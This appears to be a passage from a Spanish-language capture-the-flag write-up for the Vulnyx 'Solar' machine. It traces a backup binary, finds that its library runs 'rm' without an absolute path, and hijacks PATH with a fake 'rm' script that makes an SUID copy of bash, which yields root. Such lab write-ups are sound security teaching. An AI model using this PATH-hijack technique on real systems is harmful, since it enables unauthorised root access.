┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ uftrace --force -a ./backups sdfadsf
Error loading library.
# DURATION     TID     FUNCTION
 253.995 us [ 83414] | strlen("sdfadsf") = 7;
   1.042 us [ 83414] | strlen("sdfadsf") = 7;
   1.884 us [ 83414] | __ctype_b_loc();
   0.872 us [ 83414] | strlen("sdfadsf") = 7;
   0.988 us [ 83414] | __ctype_b_loc();
   0.962 us [ 83414] | strlen("sdfadsf") = 7;
   0.750 us [ 83414] | __ctype_b_loc();
   0.819 us [ 83414] | strlen("sdfadsf") = 7;
   0.759 us [ 83414] | __ctype_b_loc();
   0.785 us [ 83414] | strlen("sdfadsf") = 7;
   0.737 us [ 83414] | __ctype_b_loc();
   0.802 us [ 83414] | strlen("sdfadsf") = 7;
   0.

985 us [ 83414] | __ctype_b_loc();
   0.941 us [ 83414] | strlen("sdfadsf") = 7;
   0.764 us [ 83414] | __ctype_b_loc();
   0.810 us [ 83414] | strlen("sdfadsf") = 7;
   4.189 us [ 83414] | strlen("05000b0b080a021c19471a06") = 24;
   4.163 us [ 83414] | __isoc99_sscanf();
   1.004 us [ 83414] | __isoc99_sscanf();
   1.121 us [ 83414] | __isoc99_sscanf();
   1.130 us [ 83414] | __isoc99_sscanf();
   1.054 us [ 83414] | __isoc99_sscanf();
   0.915 us [ 83414] | __isoc99_sscanf();
   0.935 us [ 83414] | __isoc99_sscanf();
   0.968 us [ 83414] | __isoc99_sscanf();
   0.930 us [ 83414] | __isoc99_sscanf();
   0.905 us [ 83414] | __isoc99_sscanf();
   1.071 us [ 83414] | __isoc99_sscanf();
   1.349 us [ 83414] | __isoc99_sscanf();
   1.590 ms [ 83414] | dlopen("libbackup.so", RTLD_LAZY) = 0;
  35.739 us [ 83414] | fwrite(0x55bd23f3e0f1, 1, 23, &_IO_2_1_stderr_) = 23;
```

Buscamos la biblioteca `libbackup.so`. 

```bash
julian@solar:~$ find / -name libbackup.so 2>/dev/null
/usr/lib/x86_64-linux-gnu/libbackup.so

julian@solar:~$ strings /usr/lib/x86_64-linux-gnu/libbackup.so
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
create_compressed_backup
snprintf
system
stderr
fprintf
libc.so.6
GLIBC_2.2.5
u+UH
/usr/bin/mysqldump --databases %s > /tmp/temp.sql && /usr/bin/gzip /tmp/temp.sql -c > %s && rm /tmp/temp.sql
Error executing mysqldump and gzip. Exit code: %d
...
```

Encontramos los mensajes de error que nos aparecen al introducir una base de datos que no existe y lo que parece ser el comando que se ejecuta en el código.

```bash
/usr/bin/mysqldump --databases %s > /tmp/temp.sql && /usr/bin/gzip /tmp/temp.sql -c > %s && rm /tmp/temp.sql
```

Como podemos utilizar nuestra variable de entorno `PATH` mientras ejecutamos el binario `backups` que utiliza la librería `libbackup.so`, aprovechamos esto para escalar privilegios.

La variable `PATH` de `julian` ya tiene diferentes carpetas donde podemos escribir.

```bash
julian@solar:~$ echo $PATH
/home/julian/.nvm/versions/node/v22.7.0/bin:/home/julian/.local/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Creamos un fichero `rm` ejecutable; es el único binario que se ejecuta sin un path absoluto en la librería `libbackup.so`.

```bash
julian@solar:~$ nano .local/bin/rm

julian@solar:~$ cat .local/bin/rm
#!/bin/bash

cp /bin/bash /tmp/
chmod u+s /tmp/bash

julian@solar:~$ chmod +x .local/bin/rm
```

Ejecutamos el binario `backups` con `doas` utilizando la contraseña de `julian` y la base de datos que existe. Esto último es importante porque, si no, nunca llegará a ejecutar el `rm`.

```bash
julian@solar:~$ doas /usr/local/bin/backups solar_energy_db
doas (julian@solar) password: 
Backup completed successfully: /var/www/sunfriends.nyx/database.sql.gz

julian@solar:~$ ls -la /tmp/bash 
-rwsr-xr-x 1 root root 1265648 sep  4 22:08 /tmp/bash
```

Utilizando el binario `bash` con SUID, podemos acceder como `root` y leer la flag.

```bash
julian@solar:~$ /tmp/bash -p

bash-5.2# cat /root/root.txt 
44d**************************5f5
```
